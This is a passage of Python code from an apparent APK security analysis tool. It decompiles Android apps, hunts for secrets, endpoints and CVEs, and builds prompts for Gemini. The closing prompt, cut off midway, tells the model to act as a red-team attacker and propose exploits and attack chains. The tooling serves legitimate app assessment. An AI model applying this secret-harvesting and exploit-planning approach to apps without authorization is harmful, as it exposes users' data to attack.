    # Count large files that were partially scanned
    large_files_partial = sum(1 for cls in all_classes_info if cls['size'] > 100000)
    
    full_scan_context += f"""
### SCAN STATISTICS
- Total classes in APK: {total_classes}
- App classes scanned: {scanned_count}
- Large files (partial scan): {large_files_partial}
- Skipped (library): {files_skipped_library}
- Skipped (timeout): {files_skipped_timeout}
- Scan duration: {scan_duration:.1f}s
- Security methods extracted: {len(extracted_methods)}
"""

    # NEW: Add resource file data to context
    if resource_data:
        full_scan_context += f"""
### RESOURCE FILE ANALYSIS

**MANIFEST SECURITY SETTINGS:**
"""
        manifest_info = resource_data.get("manifest", {})
        if manifest_info:
            full_scan_context += f"  - Debuggable: {manifest_info.get('debuggable', 'not set')}\n"
            full_scan_context += f"  - Allow Backup: {manifest_info.get('allowBackup', 'not set')}\n"
            full_scan_context += f"  - Uses Cleartext Traffic: {manifest_info.get('usesCleartextTraffic', 'not set')}\n"
            full_scan_context += f"  - Network Security Config: {manifest_info.get('networkSecurityConfig', 'not set')}\n"
            
            exported = manifest_info.get('exported_components', [])
            if exported:
                full_scan_context += f"\n**EXPORTED COMPONENTS ({len(exported)}):**\n"
                for comp in exported[:10]:
                    full_scan_context += f"  - [{comp['type']}] {comp['name']}\n"
                if len(exported) > 10:
                    full_scan_context += f"  ...and {len(exported) - 10} more\n"
        
        potential_keys = resource_data.get("potential_keys", [])
        if potential_keys:
            full_scan_context += f"\n**POTENTIAL API KEYS IN STRINGS.XML ({len(potential_keys)}):**\n"
            for key in potential_keys[:5]:
                full_scan_context += f"  - {key['name']}: {key['value'][:50]}{'...' if len(key['value']) > 50 else ''}\n"
        
        urls = resource_data.get("urls", [])
        if urls:
            full_scan_context += f"\n**URLS IN STRINGS.XML ({len(urls)}):**\n"
            for url in urls[:10]:
                full_scan_context += f"  - {url['name']}: {url['value']}\n"
        
        network_config = resource_data.get("network_config", {})
        if network_config.get("cleartext_domains"):
            full_scan_context += f"\n**CLEARTEXT TRAFFIC ALLOWED FOR:**\n"
            for domain in network_config.get("cleartext_domains", [])[:5]:
                full_scan_context += f"  - {domain}\n"

    # NEW: Add extracted security methods to context
    if extracted_methods:
        full_scan_context += f"""
### SECURITY-RELEVANT METHODS ({len(extracted_methods)} extracted)

These methods were automatically identified as security-relevant based on their names/patterns:
"""
        for method_info in extracted_methods[:50]:  # Show top 50 methods
            full_scan_context += f"\n**{method_info['class']}.{method_info['method_name']}()**\n"
            full_scan_context += f"Category: {method_info['category']}\n"
            # Truncate very long methods
            code = method_info['code']
            if len(code) > 1500:
                code = code[:1500] + "\n  // ... truncated ..."
            full_scan_context += f"```java\n{code}\n```\n"
    
    return {
        "full_scan_context": full_scan_context,
        "class_summaries": all_classes_info,
        "detected_features": list(detected_features),
        "api_endpoints": list(api_endpoints),
        "security_summary": security_summary,
        "feature_summary": feature_summary,
        "resource_data": resource_data,  # NEW: Include resource analysis
        "extracted_methods": extracted_methods,  # NEW: Include extracted methods
        "stats": {
            "total_classes": total_classes,
            "scanned_classes": scanned_count,
            "large_files_partial": large_files_partial,
            "features_detected": len(detected_features),
            "security_patterns_found": sum(len(v) for v in security_summary.values()),
            "endpoints_found": len(api_endpoints),
            "app_package": app_package,
            "skipped_library": files_skipped_library,
            "skipped_timeout": files_skipped_timeout,
            "scan_duration_seconds": round(scan_duration, 1),
            "security_methods_extracted": len(extracted_methods)  # NEW
        }
    }


def _collect_comprehensive_source_context(output_dir: Path, max_classes: int = 80) -> Dict[str, Any]:
    """
    Collect comprehensive decompiled source code context for AI analysis.
    
    Returns a structured dict with:
    - Categorized code samples (auth, network, storage, UI, etc.)
    - App structure analysis (activities, services, etc.)
    - API endpoint extraction
    - Feature detection
    """
    sources_dir = output_dir / "sources"
    if not sources_dir.exists():
        return {"code_context": "", "features": [], "endpoints": [], "stats": {}}
    
    # Extended priority patterns with more categories
    priority_patterns = [
        # Core functionality
        (r"MainActivity|LauncherActivity|SplashActivity", "main_entry", 100),
        (r"(?i)home|dashboard|main.*activity", "main_screen", 90),
        # Authentication & Security
        (r"(?i)login|auth|signin|signup|register|credential|session", "auth", 95),
        (r"(?i)password|passwd|secret|apikey|api_key|token", "secrets", 90),
        (r"(?i)oauth|sso|saml|openid", "oauth", 85),
        (r"(?i)biometric|fingerprint|face.*recognition", "biometric", 80),
        # Network & API
        (r"(?i)api|http|https|request|response|retrofit|okhttp", "network", 85),
        (r"(?i)websocket|socket|mqtt|grpc", "realtime", 80),
        (r"(?i)download|upload|sync|cloud", "sync", 70),
        # Data & Storage
        (r"(?i)database|sqlite|room|realm|dao|repository", "database", 80),
        (r"(?i)preference|sharedpref|datastore|settings", "storage", 75),
        (r"(?i)cache|memory|persist", "cache", 65),
        # Payment & Commerce
        (r"(?i)payment|billing|purchase|credit|card|checkout|cart", "payment", 90),
        (r"(?i)stripe|paypal|braintree|square", "payment_sdk", 85),
        (r"(?i)subscription|premium|pro|upgrade", "monetization", 75),
        # User Features
        (r"(?i)profile|account|user|member", "user_mgmt", 70),
        (r"(?i)notification|push|fcm|firebase.*messaging", "notifications", 70),
        (r"(?i)chat|message|conversation|inbox", "messaging", 75),
        (r"(?i)feed|timeline|post|comment|like|share", "social", 70),
        (r"(?i)search|filter|query|browse", "search", 65),
        # Media & Content
        (r"(?i)camera|photo|image|gallery|picker", "camera", 70),
        (r"(?i)video|player|media|stream|audio", "media", 70),
        (r"(?i)scan|barcode|qr|ocr", "scanning", 75),
        # Location & Maps
        (r"(?i)location|gps|geo|map|place|address", "location", 70),
        (r"(?i)navigation|route|direction|tracking", "navigation", 65),
        # Analytics & Monitoring
        (r"(?i)analytics|tracking|metric|event|log", "analytics", 60),
        (r"(?i)firebase|crashlytics|amplitude|mixpanel", "analytics_sdk", 55),
        # Android Components
        (r"Activity\.java$", "activity", 60),
        (r"Fragment\.java$", "fragment", 55),
        (r"Service\.java$", "service", 65),
        (r"Receiver\.java$", "receiver", 60),
        (r"(?i)viewmodel|presenter|controller", "architecture", 50),
        (r"(?i)adapter|holder|recycler", "ui_list", 45),
        # Utility & Config
        (r"(?i)config|constant|util|helper|manager", "utility", 40),
        (r"(?i)model|entity|dto|pojo", "models", 35),
    ]
    
    collected_classes = []
    seen_paths = set()
    detected_features = set()
    detected_endpoints = []
    
    all_java_files = list(sources_dir.rglob("*.java"))
    total_classes = len(all_java_files)
    
    # Score and rank all files
    scored_files = []
    for java_file in all_java_files:
        rel_path = str(java_file.relative_to(sources_dir))
        
        # Skip third-party libraries for functionality analysis
        if any(lib in rel_path.lower() for lib in ['com/google/', 'androidx/', 'android/', 'kotlin/', 'okhttp3/', 'retrofit2/', 'com/squareup/', 'com/facebook/', 'com/twitter/', 'io/reactivex/']):
            continue
        
        score = 0
        categories = set()
        
        try:
            file_size = java_file.stat().st_size
            
            # Skip very small files (probably stubs/interfaces)
            if file_size < 200:
                continue
            
            # For large files (>80KB): read partial content but still include them
            # They might be important API clients, main activities, etc.
            if file_size > 80000:
                with open(java_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content_start = f.read(40000)
                    f.seek(max(0, file_size - 20000))
                    content_end = f.read(20000)
                content = content_start + "\n// ... [TRUNCATED - LARGE FILE] ...\n" + content_end
            else:
                content = java_file.read_text(encoding='utf-8', errors='ignore')
            
            check_text = rel_path + "\n" + content[:6000]
            
            for pattern, category, points in priority_patterns:
                if re.search(pattern, check_text):
                    score += points
                    categories.add(category)
                    detected_features.add(category)
            
            # Extract API endpoints
            url_patterns = re.findall(r'["\'](https?://[^"\']+)["\']', content)
            api_patterns = re.findall(r'["\']/?api/[^"\']+["\']|["\']/?v\d+/[^"\']+["\']', content)
            for url in url_patterns[:5]:
                if 'api' in url.lower() or '/v1' in url or '/v2' in url:
                    detected_endpoints.append(url)
            for api in api_patterns[:3]:
                detected_endpoints.append(api.strip('"\''))
            
            # Boost for classes with multiple relevant categories
            if len(categories) >= 3:
                score *= 1.4
            
            if score > 0:
                scored_files.append({
                    "path": rel_path,
                    "score": score,
                    "categories": list(categories),
                    "size": file_size,
                    "content": content
                })
                
        except Exception:
            pass
    
    # Sort by score and take top N
    scored_files.sort(key=lambda x: x["score"], reverse=True)
    collected_classes = scored_files[:max_classes]
    
    # Build comprehensive code context
    code_context = f"\n\n## COMPREHENSIVE SOURCE CODE ANALYSIS\n"
    code_context += f"Total Classes in APK: {total_classes}\n"
    code_context += f"Security-Relevant Classes Analyzed: {len(collected_classes)}\n"
    code_context += f"Detected Feature Categories: {', '.join(sorted(detected_features))}\n\n"
    
    # Group by primary category for better organization
    by_category = {}
    for cls in collected_classes:
        primary_cat = cls["categories"][0] if cls["categories"] else "other"
        if primary_cat not in by_category:
            by_category[primary_cat] = []
        by_category[primary_cat].append(cls)
    
    for category, classes in sorted(by_category.items()):
        code_context += f"\n### === {category.upper().replace('_', ' ')} RELATED CODE ({len(classes)} classes) ===\n\n"
        for cls in classes[:12]:  # Increased from 8 - More classes per category for comprehensive analysis
            code_context += f"#### {cls['path']}\n```java\n{cls['content'][:15000]}\n```\n\n"
    
    return {
        "code_context": code_context,
        "features": list(detected_features),
        "endpoints": list(set(detected_endpoints))[:20],
        "stats": {
            "total_classes": total_classes,
            "analyzed_classes": len(collected_classes),
            "categories_found": len(detected_features)
        }
    }


def _collect_source_code_samples(output_dir: Path, max_classes: int = 15) -> str:
    """Legacy function for backwards compatibility."""
    result = _collect_comprehensive_source_context(output_dir, max_classes)
    return result.get("code_context", "")


async def generate_apk_ai_reports(
    result: ApkAnalysisResult, 
    output_dir: Optional[Path] = None, 
    decompiled_findings: Optional[List[Dict]] = None,
    verification_results: Optional[Dict[str, Any]] = None
) -> Optional[ApkAIReports]:
    """
    Generate two separate AI reports: functionality and security.
    
    Args:
        result: The APK analysis result with metadata
        output_dir: Optional JADX output directory to include decompiled source code
        decompiled_findings: Optional list of findings from pattern-based scanners
        verification_results: Optional dict with verified_findings (FP-filtered) and verification_stats
    """
    if not settings.gemini_api_key:
        return None
    
    try:
        from google import genai
        from google.genai import types
        
        client = genai.Client(api_key=settings.gemini_api_key)
        
        # PHASE 1: Parallel scan of ALL files for fast structured context
        parallel_scan_data = {"aggregated": {}, "stats": {}}
        if output_dir and Path(output_dir).exists():
            logger.info("AI Reports: Phase 1 - Parallel scan of all source files...")
            parallel_scan_data = _scan_files_parallel(Path(output_dir), max_files=800, workers=4)  # FIX #5: Increased from 500
            logger.info(f"AI Reports: Parallel scan completed - {parallel_scan_data['stats'].get('scanned', 0)} files in {parallel_scan_data['stats'].get('duration_seconds', 0)}s")
        
        # PHASE 2: Cross-reference analysis for data flow understanding
        cross_ref_data = {"call_graph": {}, "data_flows": [], "component_interactions": []}
        if output_dir and Path(output_dir).exists():
            logger.info("AI Reports: Phase 2 - Cross-reference analysis...")
            cross_ref_data = _analyze_cross_references(Path(output_dir), max_files=500)  # FIX #5: Increased from 300
            logger.info(f"AI Reports: Cross-ref found {cross_ref_data['stats'].get('call_edges', 0)} call edges, {cross_ref_data['stats'].get('sensitive_data_fields', 0)} sensitive fields")
        
        # PHASE 3: Full structured scan for AI context
        full_scan_data = {"full_scan_context": "", "stats": {}}
        if output_dir and Path(output_dir).exists():
            logger.info("AI Reports: Phase 3 - Deep structured scan...")
            full_scan_data = _scan_all_files_for_ai_context(Path(output_dir))
            logger.info(f"AI Reports: Scanned {full_scan_data['stats'].get('scanned_classes', 0)} classes, found {full_scan_data['stats'].get('features_detected', 0)} feature categories")
        
        full_scan_context = full_scan_data.get("full_scan_context", "")
        all_detected_features = full_scan_data.get("detected_features", [])
        all_endpoints = full_scan_data.get("api_endpoints", [])
        full_scan_stats = full_scan_data.get("stats", {})
        
        # PHASE 4: Get detailed code samples for key classes
        source_context_data = {"code_context": "", "features": [], "endpoints": [], "stats": {}}
        if output_dir and Path(output_dir).exists():
            logger.info("AI Reports: Phase 4 - Extracting detailed code samples...")
            source_context_data = _collect_comprehensive_source_context(Path(output_dir), max_classes=150)  # FIX #5: Increased from 80
        
        source_code_context = source_context_data.get("code_context", "")
        detected_features = source_context_data.get("features", [])
        detected_endpoints = source_context_data.get("endpoints", [])
        source_stats = source_context_data.get("stats", {})
        
        # Merge features and endpoints from all sources
        all_features = list(set(
            all_detected_features + 
            detected_features + 
            parallel_scan_data.get("aggregated", {}).get("features", [])
        ))
        all_api_endpoints = list(set(
            all_endpoints + 
            detected_endpoints +
            parallel_scan_data.get("aggregated", {}).get("endpoints", [])
        ))
        
        # PHASE 5: CVE/CWE Database Lookup for known vulnerabilities
        cve_data = {"libraries": [], "cves": [], "stats": {}}
        if output_dir and Path(output_dir).exists():
            logger.info("AI Reports: Phase 5 - CVE/CWE database lookup...")
            try:
                # Get all Java class names from decompiled code
                class_names = []
                sources_dir = Path(output_dir) / "sources"
                if sources_dir.exists():
                    for java_file in sources_dir.rglob("*.java"):
                        try:
                            rel_path = java_file.relative_to(sources_dir)
                            class_name = str(rel_path).replace("/", ".").replace("\\", ".").replace(".java", "")
                            class_names.append(class_name)
                        except:
                            pass
                
                # FIX #2: Extract dependencies with version info from APK resources
                libraries = extract_apk_dependencies(class_names, None, output_dir)
                cve_data["libraries"] = [
                    {
                        "name": lib.maven_coordinate, 
                        "version": lib.version, 
                        "version_source": lib.version_source,
                        "version_confidence": lib.version_confidence,
                        "is_high_risk": lib.is_high_risk, 
                        "risk_reason": lib.risk_reason
                    }
                    for lib in libraries
                ]
                
                # Lookup CVEs for detected libraries
                if libraries:
                    cves = await lookup_apk_cves(libraries)
                    cve_data["cves"] = cves
                    cve_data["stats"] = {
                        "total_libraries": len(libraries),
                        "high_risk_libraries": sum(1 for lib in libraries if lib.is_high_risk),
                        "total_cves": len(cves),
                        "critical_cves": sum(1 for cve in cves if cve.get("severity", "").lower() == "critical"),
                        "high_cves": sum(1 for cve in cves if cve.get("severity", "").lower() == "high"),
                    }
                    logger.info(f"AI Reports: CVE lookup found {len(cves)} CVEs in {len(libraries)} libraries")
            except Exception as e:
                logger.warning(f"CVE lookup failed: {e}")
        
        # Build CVE context for AI prompts
        cve_context = ""
        if cve_data["cves"]:
            cve_context = f"""

=== KNOWN CVEs IN DEPENDENCIES (OSV.dev Database) ===
Total Libraries Detected: {cve_data['stats'].get('total_libraries', 0)}
High-Risk Libraries: {cve_data['stats'].get('high_risk_libraries', 0)}
Total CVEs Found: {cve_data['stats'].get('total_cves', 0)}
Critical CVEs: {cve_data['stats'].get('critical_cves', 0)}
High Severity CVEs: {cve_data['stats'].get('high_cves', 0)}

CRITICAL & HIGH SEVERITY CVEs:
"""
            critical_high_cves = [cve for cve in cve_data["cves"] if cve.get("severity", "").lower() in ("critical", "high")]
            for cve in critical_high_cves[:15]:
                cve_context += f"""
 [{cve.get('severity', 'UNKNOWN').upper()}] {cve.get('cve_id', 'Unknown')}
  Library: {cve.get('library', 'Unknown')} v{cve.get('library_version', '?')}
  Summary: {cve.get('summary', 'No summary')[:200]}
  CVSS Score: {cve.get('cvss_score', 'N/A')}
  Attack Vector: {cve.get('attack_vector', 'N/A')}
  Fixed Version: {cve.get('fixed_version', 'N/A')}
"""
            
            # Add medium severity CVEs (truncated)
            medium_cves = [cve for cve in cve_data["cves"] if cve.get("severity", "").lower() == "medium"]
            if medium_cves:
                cve_context += f"""
MEDIUM SEVERITY CVEs ({len(medium_cves)}):
"""
                for cve in medium_cves[:5]:
                    cve_context += f" {cve.get('cve_id', 'Unknown')} in {cve.get('library', 'Unknown')}: {cve.get('summary', '')[:100]}\n"
        
        # Build decompiled findings context for security report
        decompiled_findings_context = ""
        if decompiled_findings:
            critical_findings = [f for f in decompiled_findings if f.get('severity') == 'critical']
            high_findings = [f for f in decompiled_findings if f.get('severity') == 'high']
            medium_findings = [f for f in decompiled_findings if f.get('severity') == 'medium']
            
            decompiled_findings_context = f"""

=== PATTERN-BASED VULNERABILITY SCAN RESULTS ===
The following vulnerabilities were found by static pattern analysis with EXACT locations:

CRITICAL VULNERABILITIES ({len(critical_findings)}):
"""
            for f in critical_findings[:10]:
                decompiled_findings_context += f"""
 [{f.get('title')}] in {f.get('file_path')} at line {f.get('line_number')}
  Category: {f.get('category')} | CWE: {f.get('cwe_id', 'N/A')}
  Code: {f.get('code_snippet', '')[:100]}
  Exploitation: {f.get('exploitation', '')[:200]}
"""
            
            decompiled_findings_context += f"""
HIGH SEVERITY VULNERABILITIES ({len(high_findings)}):
"""
            for f in high_findings[:8]:
                decompiled_findings_context += f"""
 [{f.get('title')}] in {f.get('file_path')} at line {f.get('line_number')}
  Category: {f.get('category')} | CWE: {f.get('cwe_id', 'N/A')}
  Code: {f.get('code_snippet', '')[:100]}
"""
            
            decompiled_findings_context += f"""
MEDIUM SEVERITY VULNERABILITIES ({len(medium_findings)}):
"""
            for f in medium_findings[:5]:
                decompiled_findings_context += f"""
 [{f.get('title')}] in {f.get('file_path')} at line {f.get('line_number')}
"""
        detected_endpoints = source_context_data.get("endpoints", [])
        source_stats = source_context_data.get("stats", {})
        
        # Categorize permissions
        dangerous_perms = [p for p in result.permissions if p.is_dangerous]
        privacy_perms = [p for p in result.permissions if any(kw in p.name.lower() for kw in ('camera', 'microphone', 'location', 'contacts', 'sms', 'call', 'calendar', 'storage'))]
        network_perms = [p for p in result.permissions if any(kw in p.name.lower() for kw in ('internet', 'network', 'wifi', 'bluetooth'))]
        
        # Get notable URLs
        suspicious_urls = [u for u in result.urls if not any(safe in u.lower() for safe in ('google.com', 'android.com', 'googleapis.com', 'gstatic.com'))]
        
        # Get data flow info if available
        data_flow_context = ""
        if result.data_flow_analysis:
            dfa = result.data_flow_analysis
            data_flow_context = f"""
Data Flow Analysis:
- Sensitive Data Sources Found: {dfa.get('total_sources', 0)}
- Data Sinks (exit points): {dfa.get('total_sinks', 0)}
- Data Flow Paths: {dfa.get('total_flows', 0)}
- Critical Flows: {dfa.get('critical_flows', 0)}
- High-Risk Flows: {dfa.get('high_risk_flows', 0)}
- Privacy Violations: {len(dfa.get('privacy_violations', []))}

Top Data Flow Concerns:
{chr(10).join(f'- {p.get("source", {}).get("source_type", "Unknown")}  {p.get("sink", {}).get("sink_type", "Unknown")}: {p.get("description", "N/A")}' for p in dfa.get('data_flow_paths', [])[:5] if isinstance(p, dict)) or 'None'}
"""
        
        # Build enhanced context for AI with feature detection
        # Combine full scan stats with detailed stats
        combined_stats = {
            "total_classes_in_app": full_scan_stats.get('total_classes', source_stats.get('total_classes', 'N/A')),
            "classes_scanned": full_scan_stats.get('scanned_classes', source_stats.get('analyzed_classes', 'N/A')),
            "detailed_samples": source_stats.get('analyzed_classes', 0),
            "feature_categories": len(all_features),
            "security_patterns": full_scan_stats.get('security_patterns_found', 0),
            "api_endpoints": len(all_api_endpoints),
        }
        
        app_context = f"""
Package: {result.package_name}
App Name: {result.app_name or 'Unknown'}
Version: {result.version_name} (code: {result.version_code})
Min SDK: {result.min_sdk}
Target SDK: {result.target_sdk}

=== APP STRUCTURE ===
Activities ({len(result.activities)}): {', '.join(result.activities[:15])}
Services ({len(result.services)}): {', '.join(result.services[:15])}
Receivers ({len(result.receivers)}): {', '.join(result.receivers[:10])}
Providers ({len(result.providers)}): {', '.join(result.providers[:10])}

=== COMPREHENSIVE CODE ANALYSIS ===
Total Classes Found: {combined_stats['total_classes_in_app']}
Classes Scanned: {combined_stats['classes_scanned']}
Detailed Code Samples: {combined_stats['detailed_samples']} priority classes
Feature Categories Detected: {combined_stats['feature_categories']}
Security Patterns Found: {combined_stats['security_patterns']}
API Endpoints Discovered: {combined_stats['api_endpoints']}

=== DETECTED FEATURE CATEGORIES ===
{', '.join(all_features) if all_features else 'Not analyzed'}

=== API ENDPOINTS FOUND IN CODE ===
{chr(10).join(all_api_endpoints[:30]) if all_api_endpoints else 'None detected'}

=== PERMISSIONS ({len(result.permissions)}) ===
Dangerous Permissions: {len(dangerous_perms)}
{chr(10).join(f'- {p.name}' for p in dangerous_perms[:15])}

Privacy-Related Permissions:
{chr(10).join(f'- {p.name}' for p in privacy_perms[:10])}

=== NATIVE LIBRARIES ===
{', '.join(result.native_libraries[:15]) or 'None'}

=== EXTERNAL URLs FOUND ===
{chr(10).join(suspicious_urls[:20]) or 'None'}

{data_flow_context}

=== CROSS-REFERENCE ANALYSIS ===
Component Interactions: {len(cross_ref_data.get('component_interactions', []))}
Sensitive Data Flows: {len(cross_ref_data.get('data_flows', []))}
Classes Analyzed: {cross_ref_data.get('stats', {}).get('classes_analyzed', 0)}
Call Graph Edges: {cross_ref_data.get('stats', {}).get('call_edges', 0)}

Key Component Interactions:
{chr(10).join(f"- {i['from']}  {i['to']}" for i in cross_ref_data.get('component_interactions', [])[:15]) or 'None identified'}

Sensitive Data Flows Detected:
{chr(10).join(f"- [{f['risk'].upper()}] {f['data_type']}: {f['field']} accessed by {', '.join(f['accessed_by'][:3])}" for f in cross_ref_data.get('data_flows', [])[:10]) or 'None detected'}

Class Hierarchy:
{chr(10).join(f"- {child} extends {parent}" for child, parent in list(cross_ref_data.get('class_hierarchy', {}).get('inheritance', {}).items())[:10]) or 'No inheritance found'}

=== FULL CODEBASE SCAN SUMMARY ===
{full_scan_context}

=== DETAILED CODE SAMPLES (Priority Classes) ===
{source_code_context}
"""

        # Build cross-reference context for architecture diagram
        cross_ref_context = f"""
=== CROSS-REFERENCE ANALYSIS FOR ARCHITECTURE ===

Component Interactions ({len(cross_ref_data.get('component_interactions', []))} found):
{chr(10).join(f"  {i['from']} --calls--> {i['to']}" for i in cross_ref_data.get('component_interactions', [])[:30]) or 'None'}

Class Inheritance Hierarchy:
{chr(10).join(f"  {child} extends {parent}" for child, parent in list(cross_ref_data.get('class_hierarchy', {}).get('inheritance', {}).items())[:20]) or 'None'}

Interface Implementations:
{chr(10).join(f"  {cls} implements {', '.join(ifaces)}" for cls, ifaces in list(cross_ref_data.get('class_hierarchy', {}).get('implementations', {}).items())[:15]) or 'None'}

Sensitive Data Fields ({len(cross_ref_data.get('data_flows', []))} found):
{chr(10).join(f"  [{f['risk'].upper()}] {f['data_type']}: {f['field']}" for f in cross_ref_data.get('data_flows', [])[:15]) or 'None'}
"""

        # ==================== REPORT 1: What Does This APK Do (COMPREHENSIVE) ====================
        functionality_prompt = f"""You are an expert Android reverse engineer and app analyst. Your task is to provide a COMPREHENSIVE analysis of what this app does based on DEEP code inspection.

## COMPLETE APP DATA
{app_context}

{cross_ref_context}

## YOUR TASK
Perform a THOROUGH analysis of the app by:
1. Reading ALL provided source code carefully
2. Tracing data flows and feature implementations
3. Identifying ALL major features and capabilities
4. Understanding how different components work together
5. Noting any hidden or non-obvious functionality

Generate a DETAILED, COMPREHENSIVE report. Use HTML formatting.

FORMAT YOUR RESPONSE AS CLEAN HTML (no markdown, no code blocks):
- Use <h3> for section headers
- Use <h4> for sub-sections
- Use <ul> and <li> for bullet points  
- Use <strong> for emphasis
- Use <p> for paragraphs
- Use <code> for class/method names

REQUIRED SECTIONS (BE THOROUGH):

<h3> Application Overview</h3>
<p>[2-3 sentences describing what this app is, its apparent purpose, and target audience - base this on actual code analysis]</p>

<h3> Core Features & Functionality</h3>
<p>Based on deep code analysis, this app provides the following features:</p>

<h4>Main Features</h4>
<ul>
<li><strong>[Feature Name]:</strong> [Detailed description of what it does, HOW it works based on the code you see, which classes implement it]</li>
[List ALL major features you can identify from the code]
</ul>

<h4>User Interface & Navigation</h4>
<ul>
<li>[Describe the app's screens/activities and navigation flow based on Activities and UI code]</li>
</ul>

<h3> Authentication & User Management</h3>
<ul>
<li><strong>Login/Registration:</strong> [How authentication works based on code - OAuth? Email? Phone? Biometric?]</li>
<li><strong>Session Management:</strong> [How sessions/tokens are handled]</li>
<li><strong>User Data:</strong> [What user data is collected/stored]</li>
</ul>

<h3> Network & API Communication</h3>
<h4>Backend Services</h4>
<ul>
<li><strong>Base URL(s):</strong> [List actual API endpoints found in code]</li>
<li><strong>API Operations:</strong> [What data is sent/received]</li>
<li><strong>Real-time Features:</strong> [WebSocket, MQTT, push notifications?]</li>
</ul>

<h4>Third-Party Services</h4>
<ul>
<li>[Firebase, Analytics, Crash reporting, etc. - identify from code]</li>
</ul>

<h3> Data Storage & Persistence</h3>
<ul>
<li><strong>Local Database:</strong> [SQLite/Room? What data is stored locally?]</li>
<li><strong>Preferences:</strong> [What's stored in SharedPreferences?]</li>
<li><strong>File Storage:</strong> [Any local file operations?]</li>
<li><strong>Caching:</strong> [How is data cached?]</li>
</ul>

<h3> Device Features & Permissions</h3>
<ul>
<li><strong>Camera:</strong> [How camera is used based on code]</li>
<li><strong>Location:</strong> [How location data is used]</li>
<li><strong>Contacts/Phone:</strong> [Access to contacts, call logs, etc.]</li>
<li><strong>Storage:</strong> [External storage access]</li>
<li><strong>Other Sensors:</strong> [Biometric, accelerometer, etc.]</li>
</ul>

<h3> Monetization & Payments</h3>
<ul>
<li>[In-app purchases? Subscriptions? Ad SDKs? Payment processing?]</li>
</ul>

<h3> Background Services & Scheduled Tasks</h3>
<ul>
<li>[What runs in the background? Sync jobs? Notifications?]</li>
</ul>

<h3> External Integrations</h3>
<ul>
<li>[Social media sharing? Deep links? App-to-app communication?]</li>
</ul>

<h3> Notable Implementation Details</h3>
<ul>
<li>[Interesting technical details you noticed in the code]</li>
<li>[Architecture patterns used (MVVM, MVP, etc.)]</li>
<li>[Notable libraries or frameworks]</li>
</ul>

<h3> What Users Should Know</h3>
<ul>
<li>[Important facts about data collection]</li>
<li>[Privacy implications]</li>
<li>[Any concerns from the code analysis]</li>
</ul>

<h3> App Complexity Assessment</h3>
<p>[Simple utility / Medium complexity / Complex enterprise app - justify based on code]</p>

BE THOROUGH AND SPECIFIC. Reference actual classes and methods you see in the code. Don't make assumptions - only report what you can verify from the code."""

        # ==================== REPORT 2: Security Findings (ATTACKER'S PERSPECTIVE) ====================
        # Use VERIFIED findings if available (FP-filtered), otherwise fall back to raw findings
        verified_vulns = []
        verified_secrets = []
        verification_summary = ""
        
        if verification_results:
            verified_vulns = verification_results.get("verified_findings", [])
            verified_secrets = verification_results.get("verified_secrets", [])
            v_stats = verification_results.get("verification_stats", {})
            
            # Build verification summary for AI context
            verification_summary = f"""
=== AI VERIFICATION APPLIED ===
Total Findings Analyzed: {v_stats.get('total', 0)}
Verified as Real: {v_stats.get('verified', 0)}
Filtered as False Positives: {v_stats.get('filtered', 0)}
Average Confidence: {v_stats.get('avg_confidence', 0):.0f}%
Verdict Breakdown:
- CONFIRMED (high confidence): {v_stats.get('by_verdict', {}).get('CONFIRMED', 0)}
- LIKELY (medium confidence): {v_stats.get('by_verdict', {}).get('LIKELY', 0)}
- SUSPICIOUS (needs investigation): {v_stats.get('by_verdict', {}).get('SUSPICIOUS', 0)}
"""
        
        # Use verified findings for the security report to avoid FPs
        # Fall back to raw findings if no verification was done
        security_issues_to_report = verified_vulns if verified_vulns else result.security_issues
        secrets_to_report = verified_secrets if verified_secrets else result.secrets
        
        # FIX #1: Separate advisory items from actual vulnerabilities
        actual_vulnerabilities = [i for i in security_issues_to_report if not i.get("is_advisory", False)]
        advisory_items = [i for i in security_issues_to_report if i.get("is_advisory", False)]
        
        security_context = f"""
{app_context}
{verification_summary}
=== VERIFIED SECURITY FINDINGS ===
Actual Vulnerabilities ({len(actual_vulnerabilities)}):
{chr(10).join(f'- [{i.get("severity", "INFO").upper()}] {i.get("category", "Unknown")}: {i.get("description", i.get("title", ""))} (confidence: {i.get("verification", {}).get("confidence", "N/A")}%)' for i in actual_vulnerabilities[:25]) or "None"}

=== SECURITY HARDENING RECOMMENDATIONS (Advisory - Not Vulnerabilities) ===
Advisory Items ({len(advisory_items)}):
{chr(10).join(f'- [ADVISORY] {i.get("category", "Unknown")}: {i.get("description", "")}' for i in advisory_items[:10]) or "None"}
NOTE: Advisory items are hardening recommendations, NOT exploitable vulnerabilities. Include them in recommendations but don't count as findings.

=== HARDCODED SECRETS DETECTED ===
Secrets/Keys Found ({len(secrets_to_report)}):
{chr(10).join(f'- {s.get("type", "secret")}: {s.get("masked_value", s.get("value", "***")[:20])} (in {s.get("file", "unknown")})' for s in secrets_to_report[:15]) or "None"}

=== APP CONFIGURATION ===
Debuggable: {result.debuggable}
Allows Backup: {result.allow_backup}
Certificate: {"Debug certificate" if result.certificate and result.certificate.is_debug_cert else "Production certificate" if result.certificate else "Unknown"}
Network Security Config: {"Present" if hasattr(result, 'network_security_config') and result.network_security_config else "Not configured"}

{decompiled_findings_context}

{cve_context}
"""

        security_prompt = f"""You are an elite RED TEAM OPERATOR performing offensive security assessment of this Android app. Your goal is to find EXPLOITABLE vulnerabilities and demonstrate HOW to attack this app.

Think like an ATTACKER, not a compliance auditor. Focus on:
- What can I ACTUALLY exploit?
- How do I chain vulnerabilities together?
- What's the realistic attack path to compromise users/data?
- What would I do FIRST if I wanted to hack this app?

## COMPLETE APP DATA WITH SOURCE CODE
{security_context}

## YOUR MISSION
Perform an OFFENSIVE security assessment:
1. Identify the ATTACK SURFACE - where can I get in?
2. Find EXPLOITABLE vulnerabilities with working attack scenarios
3. Build ATTACK CHAINS - how do multiple weaknesses combine?
4. Prioritize by REAL-WORLD EXPLOITABILITY, not theoretical risk
5. Provide PROOF-OF-CONCEPT ideas for each finding
6. Think about what a malicious app/attacker on the same device could do
7. Consider both REMOTE attacks (network) and LOCAL attacks (malicious app, physical access)

Generate an ATTACKER-FOCUSED security report. Use HTML formatting.

FORMAT YOUR RESPONSE AS CLEAN HTML (no markdown, no code blocks):
- Use <h3> for section headers
- Use <h4> for sub-sections
- Use <ul> and <li> for bullet points
- Use <strong> for emphasis
- Use <code> for code/commands
- Severity badges: <span style="color: #dc2626; font-weight: bold;">CRITICAL</span>, <span style="color: #ea580c; font-weight: bold;">HIGH</span>, <span style="color: #ca8a04; font-weight: bold;">MEDIUM</span>, <span style="color: #16a34a; font-weight: bold;">LOW</span>

